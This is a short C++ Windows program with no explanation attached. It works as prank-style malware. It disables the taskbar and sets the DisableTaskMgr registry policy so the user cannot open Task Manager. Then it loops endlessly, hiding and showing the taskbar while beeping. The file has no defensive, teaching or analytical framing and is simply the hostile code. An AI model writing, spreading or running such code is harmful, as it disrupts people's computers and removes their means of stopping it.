#include <windows.h>
#include <iostream>




int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE PrevInstance,
	LPSTR lpszArgument, int nFunsterStil)
{
	int Freq = 1000;
	int Duration = 100;
	HWND hWin;
	hWin = FindWindow("Shell_TrayWnd", NULL);
	EnableWindow(hWin, false);
	HKEY hkey;
	DWORD dwDisposition;
	bool ok = false;
	if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, 0, KEY_WRITE, NULL, &hkey, &dwDisposition) == ERROR_SUCCESS) {
		DWORD rofl = 1;
		if (RegSetValueEx(hkey, TEXT("DisableTaskMgr"), 0, REG_DWORD, (PBYTE)&rofl, sizeof(DWORD)) == ERROR_SUCCESS) {
			ok = true;
		}
		RegCloseKey(hkey);
	}
	while (true) {
		ShowWindow(hWin, false);
		Sleep(100);
		Beep(Freq, Duration);
		Sleep(100);
		ShowWindow(hWin, true);

	}
	return 0;
}
